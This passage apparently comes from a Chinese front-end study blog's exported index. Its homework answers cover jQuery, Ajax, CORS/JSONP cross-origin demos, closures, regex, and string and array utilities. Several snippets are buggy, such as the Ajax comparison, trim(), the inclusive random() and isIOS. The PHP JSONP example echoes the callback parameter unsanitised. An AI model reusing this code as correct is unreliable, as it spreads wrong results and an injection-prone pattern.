$(this).css('border','1px solid #00f'); &#125;);$input.on('change',function()&#123; $(this).val($this.cal().toUpperCase()); &#125;);$input.on('blur',function()&#123; $(this).css('border','none'); &#125;);/*当选择 select 后，获取用户选择的内容*/$select.on('change',function()&#123; console.log($(this).val()); &#125;) 用 jQuery ajax 实现当点击加载更多会加载数据展示到页面效果预览效果。12345678910111213141516171819var isLoading = true;var pageNum = 1;var pageSize = 5;$btn.on('click',function()&#123; if(isLoading)&#123; isLoading = false; $.get('/getNews',&#123;'page' : pageNum,'pageSize' :pageSize&#125;,function(data)&#123; isLoading = true; if(data.status.statusCode = 1)&#123; for(key in data)&#123; $ul.append(&lt;li&gt; + 'data[key]' + &lt;/li&gt;); pageNum++; &#125;else&#123; alert(data.status.errorMessage); &#125; &#125; &#125;); &#125; &#125;); APIDoc/getNews GETparams:1234&#123; page : 1, pageSize : 5&#125;Success:12345678910111213&#123; 'data':&#123; '0' : '新闻1'， '1' : '新闻2'， '2' : '新闻3'， '3' : '新闻4'， '4' : '新闻5'， &#125;, 'status':&#123; 'statusCode' : 1, 'errorMessage' : 'Success' &#125;&#125;Error:1234567&#123; 'data':&#123;&#125;, 'status':&#123; 'statusCode' : 0, 'errorMessage' : 'Error' &#125;&#125;]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery选择器_Dom操作_样式_事件处理_动画]]></title>
    <url>%2Fblog%2F2017%2F10%2F05%2FjQuery%E9%80%89%E6%8B%A9%E5%99%A8-Dom%E6%93%8D%E4%BD%9C-%E6%A0%B7%E5%BC%8F-%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86-%E5%8A%A8%E7%94%BB%2F</url>
    <content type="text"><![CDATA[jQuery 能做什么？jQuery提供了一个简洁的元素选择器，用简单的函数名称和语法封装了原生DOMAPI，提供了DOM增改删查操作，Ajax，动画，事件操作等功能，并提供了拓展自身功能的接口。 jQuery 对象和 DOM 原生对象有什么区别？如何转化？jQuery对象只可以使用jQuery封装的API，DOM原生对象只可以使用DOM原生API。jQuery对象加数组下标即可转化为DOM原生对象，DOM原生对象以$()包裹即可转化为jQuery对象。 jQuery中如何绑定事件？bind、unbind、delegate、live、on、off都有什么作用？推荐使用哪种？使用on绑定事件使用事件代理的写法？123456$(selector).bind(type,[data],function(eventObject)); //jQuery3.0已经删除此方法$(selector).unbind(type,[data|fn]]); //jQuery3.0已经删除此方法$(selector).delegate(selector,[type],[data],fn); //jQuery3.0已经删除此方法，代理用参数中selector为principal，$选择器中selector为agent$(selector).live(type, [data], fn); //jQuery1.7已经删除此方法，给所有匹配的元素附加一个事件处理函数，即使这个元素是以后再添加进来的也有效。$(selector).on(events,[selector],[data],fn); //在选择元素上绑定一个或多个事件的事件处理函数。当参数中selector不为空时，此函数则为其做事件代理。其中events之后可以加“.id”来标定某一个点击事件$(selector).off(events,[selector],[fn]); //在选择元素上移除一个或多个事件的事件处理函数。特定的事件处理程序可以被移除元素上提供事件的名称，命名空间，选择器，或处理函数名称的组合。当有多个过滤参数，所提供的参数都必须匹配的事件处理程序被删除。 在jQuery1.7之后，建议使用on/off方法，jQuery3.0以后，已经删除bind、unbind、delegate方法。使用on绑定事件使用事件代理的写法：1234$('agent').on('event','principal',function(e)&#123; //callback this === document.querySelector('principal'); //true &#125;); jQuery 如何展示/隐藏元素？123/* jQuery展示/隐藏元素 */$(selector).show();//展示$(selector).hide();//隐藏 jQuery 动画如何使用？1$(selector).animate(&#123;params&#125;,speed,callback); 其中{params}为之后的CSS样式，（事实上jQuery不支持某些css样式渐变如background-color，这个时候用css3的transition属性更为好用），speed为动画时间，callback为动画执行完毕时候产生的回调函数。animate支持链式调用，支持动画队列。动画会依次执行。另有一堆封装好的动画方法，还有两个特殊的方法：12$(selector).finish();//停止动画于最终样式$(selector).stop();//停止动画于此序列最终样式 如何设置和获取元素内部 HTML 内容？如何设置和获取元素内部文本？123456/* 获取元素的html与设置元素的html */$(selector).html();//获取$(selector).html(value);//设置/* 获取元素的text与设置元素的text */$(selector).text();//获取$(selector).text(value);//设置 如何设置和获取表单用户输入或者选择的内容？如何设置和获取元素属性？123456/* 获取元素的值与设置元素的值 */$(selector).val();//获取$(selector).val(value);//设置/* 获取和设置元素属性 */$(selector).attr('Arrtibute');//获取$(selector).attr('Arrtibute','value');//设置 作业进阶14]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[跨域]]></title>
    <url>%2Fblog%2F2017%2F10%2F04%2F%E8%B7%A8%E5%9F%9F%2F</url>
    <content type="text"><![CDATA[什么是同源策略同源策略是指浏览器为了防止非同源网址使用Ajax导致的安全隐患而采取的禁止调用非同源网址的Ajax请求的策略。同源网址有三大特征： 协议相同 网址相同 端口相同 什么是跨域？跨域有几种实现形式跨域是指绕过同源策略，使得不同源间的网址可以相互做出Ajax请求（或者达到类似Ajax请求的效果）的方式。跨域一般有四种实现方式。 JSONP CORS 降域 PostMessage JSONP 的原理是什么JSONP是指将请求返回的数据包装成JS可执行函数的形式，将真实数据作为参数传入此函数中，从而使用script标签来获取数据的方式。本质上来讲script标签获取脚本并非Ajax，所以不受同源策略影响。具体步骤为：先创造一个 script 标签，然后把 src 赋值为后端的地址再加上 ?callback=doJSONP，其中 doJSONP 为自定义的函数的名字，再利用 script 标签向目标发送跨域请求。目标接收到请求后，解析里面的 callback 参数，然后返回函数包含数据的格式，例如 1res.send(callback+'('+JSON.stringify(data)+')') // data为要返回的数据 等到脚本加载完毕后，doJSONP 函数就会自动执行，从而能够处理跨域请求的数据 CORS是什么CORS是指在后端对请求添加Access-Control-Allow-Origin头，在现代浏览器中，只要Access-Control-Allow-Origin头包含发起请求的域，则将此次请求视为“跨域资源共享”，允许跨域。当使用 XMLHttpRequest 发送请求时，浏览器发现该请求不符合同源策略，会给该请求加一个请求头：Origin，后台进行一系列处理，如果确定接受请求则在返回结果中加入一个响应头：Access-Control-Allow-Origin; 浏览器判断该相应头中是否包含 Origin 的值，如果有则浏览器会处理响应，我们就可以拿到响应数据，如果不包含则会报跨域错误。所以 CORS 的表象与同源的 ajax 请求没区别，代码完全一样。 演示三种以上跨域的解决方式CORS跨域以我的曾经一个小Demo“十条评论区”的后端PHP代码为例：12&lt;?php header('Access-Control-Allow-Origin:http://comment.zain.red');header("Content-Type: text/html;charset=utf-8");只要在代码头加入Access-Control-Allow-Origin，值为允许的网址，即可实现跨域资源共享。 JSONP跨域1234567&lt;!-- 前端代码 --&gt;&lt;script&gt; var printfData = function(data)&#123; console.log(data); &#125;&lt;/script&gt;&lt;script src="http://a.zain.red/data?callback=printfData"&gt;&lt;/script&gt; 123456/* 后端代码 */&lt;?php$result = "我是数据"; $callback = $_GET['callback']; echo $callback."($result)"; 降域实现iframe跨域在使用iframe时，可通过定义document.domain实现降域。12&lt;!-- http://zain.red/index.html--&gt;&lt;iframe src="http://a.zain.red/data.html"&gt;&lt;/iframe&gt;12345&lt;!-- http://a.zain.red/index.html--&gt;&lt;div&gt;12342234&lt;/div&gt;&lt;script&gt; document.domain = "zain.red";&lt;/script&gt;]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ajax实践]]></title>
    <url>%2Fblog%2F2017%2F10%2F03%2FAjax%E5%AE%9E%E8%B7%B5%2F</url>
    <content type="text"><![CDATA[ajax 是什么？有什么作用？ajax 全称Async Javascript And XML（异步Javascript和XML脚本），可以在不刷新页面的情况下发送网络请求，并在不影响其他操作的情况下等网络请求回传时执行操作。 前后端开发联调需要注意哪些事情？后端接口完成前如何 mock 数据？前后端开发联调要约定四点： 请求路径 请求方法 请求参数 回传数据格式 后端接口完成前可以使用server-mock等工具进行mock，也可以使用easymock等在线接口进行mock。 点击按钮，使用 ajax 获取数据，如何在数据到来之前防止重复点击?在点击事件的作用域定义一个“状态锁“变量，在click事件中做一个状态锁是否为开的判断。如果状态锁为开，则把状态锁关上后执行网络请求，在网络请求的回调函数把状态锁打开。如果状态锁为关，则不执行语句。 实现加载更多的功能，后端在本地使用server-mock来模拟数据进阶12作业]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[闭包_定时器_BOM]]></title>
    <url>%2Fblog%2F2017%2F10%2F02%2F%E9%97%AD%E5%8C%85-%E5%AE%9A%E6%97%B6%E5%99%A8-BOM%2F</url>
    <content type="text"><![CDATA[下面的代码输出多少？修改代码让 fnArri 输出 i。使用 两种以上的方法1234567var fnArr = [];for (var i = 0; i &lt; 10; i ++) &#123; fnArr[i] = function()&#123; return i; &#125;;&#125;console.log( fnArr[3]() ); //10 1234567var fnArr = [];for (let i = 0; i &lt; 10; i ++) &#123; fnArr[i] = function()&#123; return i; &#125;;&#125;console.log( fnArr[3]() ); //3 123456789var fnArr = [];for (var i = 0; i &lt; 10; i ++) &#123; !function()&#123; fnArr[i] = function()&#123; return i; &#125;; &#125;()&#125;console.log( fnArr[3]() ); //3 封装一个汽车对象，可以通过如下方式获取汽车状态12345678910111213141516171819202122232425262728293031323334353637var Car = (function()&#123; var speed = 0; function setSpeed(s)&#123; speed = s; &#125; function getSpeed()&#123; return speed; &#125; function accelerate()&#123; speed += 10; &#125; function decelerate()&#123; speed&gt;=10?speed-=10:speed=0; &#125; function getStatus()&#123; if(speed==0)return 'stop';else return 'running'; &#125; return &#123; setSpeed: setSpeed, getSpeed: getSpeed, accelerate: accelerate, decelerate: decelerate, getStatus: getStatus, &#125;&#125;)()Car.setSpeed(30);Car.getSpeed(); //30Car.accelerate();Car.getSpeed(); //40;Car.decelerate();Car.decelerate();Car.getSpeed(); //20Car.getStatus(); // 'running';Car.decelerate();Car.decelerate();Car.getStatus(); //'stop';//Car.speed; //error 下面这段代码输出结果是? 为什么?12345678910var a = 1;setTimeout(function()&#123; a = 2; console.log(a);&#125;, 0);var a ;console.log(a);a = 3;console.log(a);//1 3 2 因为setTimeout函数会在外面的函数体执行完成后处理，所以即使定时器时间为0，仍旧会在所有代码执行后再执行。 下面这段代码输出结果是? 为什么?123456var flag = true;setTimeout(function()&#123; flag = false;&#125;,0)while(flag)&#123;&#125;//(1)console.log(flag); 这段代码将会陷入死循环于(1)，无法输出结果。原因也是如上题setTimeout的机理决定。卡死在while的代码并不会执行setTimeout里面的函数。 下面这段代码输出？如何输出delayer: 0, delayer:1…（使用闭包来实现）1234567for(var i=0;i&lt;5;i++)&#123; setTimeout(function()&#123; console.log('delayer:' + i ); &#125;, 0); console.log(i);&#125;//0 1 2 3 4 delayer:5 delayer:5 delayer:5 delayer:5 delayer:5 12345678for(var i=0;i&lt;5;i++)&#123; !function(i)&#123; setTimeout(function()&#123; console.log('delayer:' + i ); &#125;, 0); &#125;(i)&#125;//delayer:0 delayer:1 delayer:2 delayer:3 delayer:4 如何获取元素的真实宽高通过element.offsetHeight和element.offsetWidth获取//ie8及以前版本：通过currentStyle URL 如何编码解码？为什么要编码？使用encodeURIComponent()方法编码，使用decodeURIComponent()方法解码。编码主要有两个目的，一是为了规避潜在的语义攻击风险，二是为了统一解析不同语言的字符。 补全如下函数，判断用户的浏览器类型123456789101112function isAndroid()&#123; return /Android/.test(window.navigator.userAgent);&#125;function isIphone()&#123; return /iPhone/.test(window.navigator.userAgent);&#125;function isIpad()&#123; return /iPad/.test(window.navigator.userAgent);&#125;function isIOS()&#123; return /Mac/.test(window.navigator.userAgent);&#125;]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[事件]]></title>
    <url>%2Fblog%2F2017%2F09%2F29%2F%E4%BA%8B%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[DOM0 事件和DOM2级在事件监听使用方式上有什么区别？DOM0事件相当于HEML节点上面的一个属性，如果重新赋值会被替换。DOM2级事件相当于增加一个事件监听，再次监听会与之前的事件叠加。甚至还可以通过第三个参数来确定事件是否冒泡。 attachEvent与addEventListener的区别？attachEvent和addEventListener的区别主要体现在attachEvent： 不存在第三个参数，无法阻止事件冒泡。 第二个参数的匿名函数中无法得到事件信息参数e。 第二个参数的匿名函数中的this指向window而不是产生事件的元素本身。 解释IE事件冒泡和DOM2事件传播机制？IE事件冒泡是指事件信息DOM树中接受事件的最下层开始向上传递直到根节点。DOM2事件传递机制是指先进行事件捕获后进行事件冒泡。事件信息从DOM根节点开始逐层下传到事件发生的目标元素，在达到目标元素后逐层冒泡上传至根节点。 如何阻止事件冒泡？ 如何阻止默认事件？DOM浏览器：在DOM2级事件监听的第二个参数即匿名函数内使用e.stopPropagation();可以阻止冒泡，使用e.preventDefault()可以阻止默认事件。IE浏览器：window.event.cancelBubble = true;//停止冒泡window.event.returnValue = false;//阻止事件的默认行为 有如下代码，要求当点击每一个元素li时控制台展示该元素的文本内容。不考虑兼容123456789101112&lt;ul class="ct"&gt; &lt;li&gt;这里是&lt;/li&gt; &lt;li&gt;饥人谷&lt;/li&gt; &lt;li&gt;前端6班&lt;/li&gt;&lt;/ul&gt;&lt;script&gt; document.querySelector('.ct').addEventListener('click',function(e)&#123; if(e.target.tagName.toLowerCase() == 'li' )&#123; console.log(e.target.innerText); &#125; &#125;);&lt;/script&gt; 补全代码，要求：当点击按钮开头添加时在&lt;li/&gt;这里是&lt;/li&gt;元素前添加一个新元素，内容为用户输入的非空字符串；当点击结尾添加时在最后一个 li 元素后添加用户输入的非空字符串.当点击每一个元素li时控制台展示该元素的文本内容。1234567891011121314151617181920212223242526272829&lt;ul class="ct"&gt; &lt;li&gt;这里是&lt;/li&gt; &lt;li&gt;饥人谷&lt;/li&gt; &lt;li&gt;任务班&lt;/li&gt;&lt;/ul&gt;&lt;input class="ipt-add-content" placeholder="添加内容"/&gt;&lt;button id="btn-add-start"&gt;开头添加&lt;/button&gt;&lt;button id="btn-add-end"&gt;结尾添加&lt;/button&gt;&lt;script&gt; document.querySelector('.ct').addEventListener('click',function(e)&#123; if(e.target.tagName.toLowerCase() == 'li' )&#123; console.log(e.target.innerText); &#125; &#125;); document.querySelector('#btn-add-start').addEventListener('click',function()&#123; if(document.querySelector('.ipt-add-content').value)&#123; var newli = document.createElement('LI'); newli.innerText = document.querySelector('.ipt-add-content').value; document.querySelector('.ct').insertBefore((newli,document.querySelector('.ct li:nth-child(1)'))); &#125; &#125;); document.querySelector('#btn-add-end').addEventListener('click',function()&#123; if(document.querySelector('.ipt-add-content').value)&#123; var newli = document.createElement('LI'); newli.innerText = document.querySelector('.ipt-add-content').value; document.querySelector('.ct').appendChild(newli); &#125; &#125;);&lt;/script&gt; 补全代码，要求：当鼠标放置在li元素上，会在img-preview里展示当前li元素的data-img对应的图片。12345678910111213141516171819&lt;ul class="ct"&gt; &lt;li data-img="1.png"&gt;鼠标放置查看图片1&lt;/li&gt; &lt;li data-img="2.png"&gt;鼠标放置查看图片2&lt;/li&gt; &lt;li data-img="3.png"&gt;鼠标放置查看图片3&lt;/li&gt;&lt;/ul&gt;&lt;div class="img-preview"&gt;&lt;/div&gt;&lt;script&gt; document.querySelector('.ct').addEventListener('click',function(e)&#123; if(e.target.tagName.toLowerCase() === "li")&#123; if(document.querySelector('.img-preview img'))&#123; document.querySelector('.img-preview img').src = e.target.getAttribute('data-img'); &#125;else&#123; var img = document.createElement('img'); img.src = e.target.getAttribute('data-img'); document.querySelector('.img-preview').appendChild(img); &#125; &#125; &#125;)&lt;/script&gt;]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则表达式]]></title>
    <url>%2Fblog%2F2017%2F09%2F28%2F%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[\d，\w,\s,[a-zA-Z0-9],\b,.,*,+,?,x{3},^,$分别是什么?\d是指一个数字，相当于[0-9]，\w相当于大小写字母，或数字下划线中的一个字符，相当于[a-zA-Z0-9_]，\s指的是一个空格字符，[a-zA-Z0-9]是指大小写字母或数字中的一个字符，\b指的是单词边界，即空格，半角中划线，字符串首或字符串尾。.是指除了回车和换行之外的任意一个字符，*是指“出现任意次”的量词标记。？是指“至多出现一次”的量词标记，x{3}是一个字符和一个量词的组合，表明为“x连着出现三次”，^出现在类内表示取反，出现在类外表示起始，$代表结束。 写一个函数trim(str)，去除字符串两边的空白字符123function trim(str)&#123; return str.replace(/\s/g,'');&#125; 写一个函数isEmail(str)，判断用户输入的是不是邮箱123function isEmail(str)&#123; return /^\w+@.+$/.test(str);&#125; 写一个函数isPhoneNum(str)，判断用户输入的是不是手机号123function isPhoneNum(str)&#123; return /^1\d&#123;10&#125;$/.test(str);&#125; 写一个函数isValidUsername(str)，判断用户输入的是不是合法的用户名（长度6-20个字符，只能包括字母、数字、下划线）123function isValidUsername(str)&#123; return /^\w&#123;6,20&#125;$/.test(str);&#125; 写一个函数isValidPassword(str), 判断用户输入的是不是合法密码（长度6-20个字符，只包括大写字母、小写字母、数字、下划线，且至少至少包括两种）12345678910function isValidPassword(str)&#123; if(!/^\w&#123;6,20&#125;$/.test(str) || /^\d&#123;6,20&#125;$/.test(str) || /^_&#123;6,20&#125;$/.test(str) || /^[A-Z]&#123;6,20&#125;$/.test(str) || /^[a-z]&#123;6,20&#125;$/.test(str) )&#123; return false; &#125;else return true;&#125; 写一个正则表达式，得到如下字符串里所有的颜色123var re = /((#[0-9a-fA-F]&#123;6&#125;)|(#[0-9a-fA-F]&#123;3&#125;))((?=;)|(?=\s))/gvar subj = "color: #121212; background-color: #AA00ef; width: 12px; bad-colors: f#fddee "console.log( subj.match(re) ) // ['#121212', '#AA00ef'] 下面代码输出什么? 为什么? 改写代码，让其输出[“”hunger””, “”world””].1234var str = 'hello "hunger" , hello "world"';var pat = /".*"/g; //["hunger" , hello "world"] 贪婪模式匹配尽量多的字符串var pat = /".*?"/g;//[""hunger"", ""world""] 非贪婪模式匹配尽量少的字符串str.match(pat);]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Math数组Date]]></title>
    <url>%2Fblog%2F2017%2F09%2F28%2FMath%E6%95%B0%E7%BB%84Date%2F</url>
    <content type="text"><![CDATA[写一个函数，返回从min到max之间的 随机整数，包括min不包括max123function random(min,max)&#123; return Math.floor(min + (max - min) * Math.random());&#125; 写一个函数，返回从min都max之间的 随机整数，包括min包括max123function random(min,max)&#123; return Math.floor(min + (max - min) * Math.random() + 1);&#125; 写一个函数，生成一个长度为 n 的随机字符串，字符串字符的取值范围包括0到9，a到 z，A到Z。123456789function getRandStr(len)&#123; var fullstr = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"; var res = ""; for(var i = 0;i &lt; len;i++)&#123; res += fullstr[Math.floor(Math.random()*fullstr.length)]; &#125; return res;&#125;var str = getRandStr(10); // 0a3iJiRZap 写一个函数，生成一个随机 IP 地址，一个合法的 IP 地址为 0.0.0.0~255.255.255.255123456function getRandIP()&#123; var arrRes = [Math.floor(Math.random()*256),Math.floor(Math.random()*256),Math.floor(Math.random()*256),Math.floor(Math.random()*256)]; return arrRes.join(".");&#125;var ip = getRandIP()console.log(ip) // 10.234.121.45 写一个函数，生成一个随机颜色字符串，合法的颜色为#000000~ #ffffff12345678910function getRandColor()&#123; var fullStr = "0123456789ABCDEF"; var res ="#"; for(var i = 0;i &lt; 6;i++)&#123; res += fullStr[Math.floor(Math.random()*fullStr.length)]; &#125; return res;&#125;var color = getRandColor()console.log(color) // #3e2f1b 数组方法里push、pop、shift、unshift、join、splice分别是什么作用？用 splice函数分别实现push、pop、shift、unshift方法push:从尾部加入一个元素，返回数组长度。pop:从尾部抛出一个元素，返回抛出的元素。unshift:从头部加入一个元素，返回数组长度。shift:从头部抛出一个元素，返回抛出的元素。splice(a,b,c,…):从数组的a位置删除b个元素并依次加入c,…元素。12345var arr = [1,2,5,4,7];arr.splice(arr.length,0,17);//arr.push(17)arr.splice(arr.length - 1,1);//arr.pop()arr.splice(0,0,17)//arr.unshift(17)arr.splice(0,1)//arr.shift(17) 写一个函数，操作数组，数组中的每一项变为原来的平方，在原数组上操作12345678function squareArr(arr)&#123; arr.forEach(function(value,index,array)&#123; array[index] = value * value; &#125;)&#125;var arr = [2, 4, 6]squareArr(arr)console.log(arr) // [4, 16, 36] 写一个函数，操作数组，返回一个新数组，新数组中只包含正数，原数组不变123456789function filterPositive(arr)&#123; return arr.filter(function(value)&#123; return value &gt; 0 &amp;&amp; typeof value == "number"; &#125;);&#125;var arr = [3, -1, 2, '饥人谷', true]var newArr = filterPositive(arr)console.log(newArr) //[3, 2]console.log(arr) //[3, -1, 2, '饥人谷', true] 写一个函数getChIntv，获取从当前时间到指定日期的间隔时间123456789101112var str = getChIntv("2017-02-08");function getChIntv(dateStr)&#123; var afterDate = new Date(dateStr); var nowDate = new Date(); var timeDifference = Math.abs(afterDate - nowDate); var second = timeDifference/1000%60; var minute = (timeDifference/1000 - second)/60%60 var hour = (timeDifference/1000 - second)/3600%24 var day = (timeDifference/1000 - second)/86400 return "距离"+ dateStr + "还有" + Math.floor(day) + "天" + Math.floor(hour) + "小时" + Math.floor(minute) + "分钟" + Math.floor(second) + "秒";&#125;console.log(str); // 距除夕还有 20 天 15 小时 20 分 10 秒 把hh-mm-dd格式数字日期改成中文日期123456789101112131415161718var str = getChsDate('2015-01-08');console.log(str); // 二零一五年一月八日function getChsDate(time)&#123; var dict = ['零','一','二','三','四','五','六','七','八','九','十','十一','十二','十三','十四','十五','十六','十七','十八','十九','二十','二十一','二十二','二十三','二十四','二十五','二十六','二十七','二十八','二十九','三十','三十一']; var arr = time.split('-'); var year = arr[0]; var month = arr[1]; var day = arr[2]; var yearCh = []; for(var i = 0; i &lt; 4; i++)&#123; yearCh.push(dict[parseInt(year[i])]); &#125; var monthCh = dict[parseInt(month)]; var dayCh = dict[parseInt(day)]; var str = yearCh.join('')+'年'+monthCh+'月'+dayCh+'日'; return str;&#125; 写一个函数，参数为时间对象毫秒数的字符串格式，返回值为字符串。假设参数为时间对象毫秒数t，根据t的时间分别返回如下字符串: 刚刚（ t 距当前时间不到1分钟时间间隔） 3分钟前 (t距当前时间大于等于1分钟，小于1小时) 8小时前 (t 距离当前时间大于等于1小时，小于24小时) 3天前 (t 距离当前时间大于等于24小时，小于30天) 2个月前 (t 距离当前时间大于等于30天小于12个月) 8年前 (t 距离当前时间大于等于12个月)1234567891011121314151617181920function friendlyDate(time)&#123; var nowDate = new Date(); var timeDifference = Math.abs(time - nowDate); if(timeDifference &lt; 60*1000)&#123; return "刚刚"; &#125;else if(timeDifference &lt; 60*1000*60)&#123; return "3分钟前"; &#125;else if(timeDifference &lt; 60*1000*60*24)&#123; return "8小时前"; &#125;else if(timeDifference &lt; 60*1000*60*24*30)&#123; return "3天前"; &#125;else if(timeDifference &lt; 60*1000*60*24*30*12)&#123; return "2个月前"; &#125;else&#123; return "8年前"; &#125;&#125;var str = friendlyDate( '1484286699422' ) // 1分钟前var str2 = friendlyDate('1483941245793') //4天前]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[字符串和JSON]]></title>
    <url>%2Fblog%2F2017%2F09%2F27%2F%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%92%8CJSON%2F</url>
    <content type="text"><![CDATA[对于 HTTP 协议而言，HTML、CSS、JS、JSON 的本质都是什么？字符串。浏览器根据相应请求头中的Content-Type以对应的语法解析这些字符串，再分别渲染执行。 使用数组拼接出如下字符串 ，其中styles数组里的个数不定1234567891011121314var prod = &#123; name: '女装', styles: ['短款', '冬季', '春装']&#125;;function getTpl(data)&#123; var res = ""; res += "&lt;dl class='product'&gt;&lt;dt&gt;" + data.name +"&lt;/dt&gt;"; for(var i = 0;i &lt; data.styles.length;i++)&#123; res += "&lt;dd&gt;" + data.styles[i] +"&lt;/dd&gt;" &#125; res += "&lt;/dl&gt;"; return res;&#125;;var result = getTpl(prod); //result为下面的字符串 1&lt;dl class="product"&gt;&lt;dt&gt;女装&lt;/dt&gt;&lt;dd&gt;短款&lt;/dd&gt;&lt;dd&gt;冬季&lt;/dd&gt;&lt;dd&gt;春装&lt;/dd&gt;&lt;/dl&gt; 写出两种以上声明多行字符串的方法例如：123456789var str1 = 'abcdeabcdeabcdeancdea\ bcdeabcdeabcdeancdeabcdeabcdeabcd\ eancdeabcdeabcdeabcdeancde';var str2 = 'abcdeabcdeabcdeancdea' +'bcdeabcdeabcdeancdeabcdeabcdeabcd' +'eancdeabcdeabcdeabcdeancde';var str3 = `abcdeabcdeabcdeancdea bcdeabcdeabcdeancdeabcdeabcdeabcd eancdeabcdeabcdeabcdeancde`;这段字符串很长，如何多行优雅的显示 补全如下代码,让输出结果为字符串: hello\饥人谷12var str = "hello\\\\饥人谷"console.log(str) 以下代码输出什么?为什么12var str = 'jirengu\nruoyu'console.log(str.length) //13,因为其中\n转移为换行符，长度为1 写一个函数，判断一个字符串是回文字符串，如 abcdcba是回文字符串, abcdcbb不是12345678function isPalindrome(str)&#123; for(var i = 0;i &lt; str.length;i++)&#123; if(str.split("")[i] !== str.split("")[str.length-1-i])&#123; return false; &#125; &#125; return true;&#125; 写一个函数，统计字符串里出现出现频率最多的字符12345678910111213141516171819function maxNumOfStr(str)&#123; var dist = &#123;&#125;; maxNumStr = ""; maxNum = 0; for(var i = 0;i &lt; str.length;i++)&#123; if(dist[str[i]] == undefined)&#123; dist[str[i]] = 1; &#125;else&#123; dist[str[i]]++; &#125; &#125; for(key in dist)&#123; if(dist[key] &gt; maxNum)&#123; maxNum = dist[key]; maxNumStr = key; &#125; &#125; return maxNumStr;&#125; 写一个camelize函数，把my-short-string形式的字符串转化成myShortString形式的字符串，如1234567891011function camelize(str)&#123; var res = str.split('-'); for(var i = 1;i &lt; res.length;i++)&#123; if(res[i].length &gt; 1)&#123; res[i] = res[i][0].toUpperCase() + res[i].slice(1); &#125;else res[i]=res[i].toUpperCase(); &#125; return res.join('');&#125;camelize("background-color") == 'backgroundColor'camelize("list-style-image") == 'listStyleImage' 写一个 ucFirst函数，返回第一个字母为大写的字符 （*）1234ucFirst("hunger") == "Hunger"function ucFirst(str)&#123; return str[0].toUpperCase() + str.slice(1);&#125; 写一个函数truncate(str, maxlength), 如果str的长度大于maxlength，会把str截断到maxlength长，并加上…，如12345truncate("hello, this is hunger valley,", 10) == "hello, thi...";truncate("hello world", 20) == "hello world";function truncate(str, maxlength)&#123; return str.length&lt;=maxlength?str:str.slice(0,maxlength) + "...";&#125; 什么是 JSON格式数据？JSON格式数据如何表示对象？window.JSON 是什么？JSON数据就是符合JSON语法的字符串，JSON格式数据以键值对的形式表示对象，键值对间以:分隔，对象间以,分隔。window.JSON是指BOM上用来操作JSON对象的工具对象，包含了parse()和stringify()等常用的JSON方法。 如何把JSON 格式的字符串转换为 JS 对象？如何把 JS对象转换为 JSON 格式的字符串?JSON 格式的字符串转换为 JS 对象用JSON.parse()方法，把 JS对象转换为 JSON 格式的字符串用JSON.stringify()方法。]]></content>
      <tags>
        <tag>技术博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[引用类型对象拷贝]]></title>
    <url>%2Fblog%2F2017%2F09%2F26%2F%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%E5%AF%B9%E8%B1%A1%E6%8B%B7%E8%B4%9D%2F</url>
    <content type="text"><![CDATA[引用类型有哪些？非引用类型有哪些引用类型有数组，对象。非引用类型有布尔，数值，字符串，undefined,null。 如下代码输出什么？为什么12345var obj1 = &#123;a:1, b:2&#125;;var obj2 = &#123;a:1, b:2&#125;;console.log(obj1 == obj2); //falseconsole.log(obj1 = obj2); //&#123;a:1,b:2&#125;(事实上是obj2的内容，实际传的值为obj2的指针)console.log(obj1 == obj2);//true 两者变量内存储的指针相等 如下代码输出什么? 为什么12345678910111213141516171819var a = 1var b = 2var c = &#123; name: '饥人谷', age: 2 &#125;var d = [a, b, c]var aa = avar bb = bvar cc = cvar dd = da = 11b = 22c.name = 'hello'd[2]['age'] = 3console.log(aa) //1，传值赋值console.log(bb) //2，传值赋值console.log(cc) //&#123;name:"hello",age:3&#125;,传引用赋值console.log(dd) //[1, 2, &#123;name:"hello",age:3&#125;],前两个数组元素传值，第三个传引用 如下代码输出什么? 为什么123456789101112131415var a = 1var c = &#123; name: 'jirengu', age: 2 &#125;function f1(n)&#123; ++n&#125;function f2(obj)&#123; ++obj.age&#125;f1(a) f2(c) f1(c.age) console.log(a) //1,函数传值调用console.log(c) //&#123;name: 'jirengu',age: 3&#125;，fn1传值调用，fn2传引用调用 过滤如下数组，只保留正数，直接在原数组上操作1234567891011var arr = [3,1,0,-1,-3,2,-5]function filter(arr)&#123; for( var i = 0;i &lt; arr.length;i++)&#123; if(arr[i] &lt;= 0)&#123; arr.splice(i,1); i = 0; &#125; &#125;&#125;filter(arr)console.log(arr) // [3,1,2] 过滤如下数组，只保留正数，原数组不变，生成新数组12345678910111213141516.var arr = [3,1,0,-1,-3,2,-5]function filter(arr)&#123; var temp = []; for(var i = 0;i&lt;arr.length;i++)&#123; if(arr[i]&gt;0)&#123; temp.push(arr[i]); &#125; &#125; return temp;&#125;var arr2 = filter(arr)console.log(arr2) // [3,1,2]console.log(arr) // [3,1,0,-1,-2,2,-5] 写一个深拷贝函数，用两种方式实现1234567891011function deepCopy1(obj)&#123; var result=&#123;&#125;; for (var key in obj) &#123; if(!obj.hasOwnProperty(key))&#123;continue;&#125; result[key] = (typeof obj[key]==='object' &amp;&amp; obj[key]!=null)? deepCopy1(obj[key]): obj[key]; &#125; return result; &#125;function deepCopy2(obj)&#123; return JSON.parse(JSON.stringify(obj));&#125;]]></content>
      <tags>
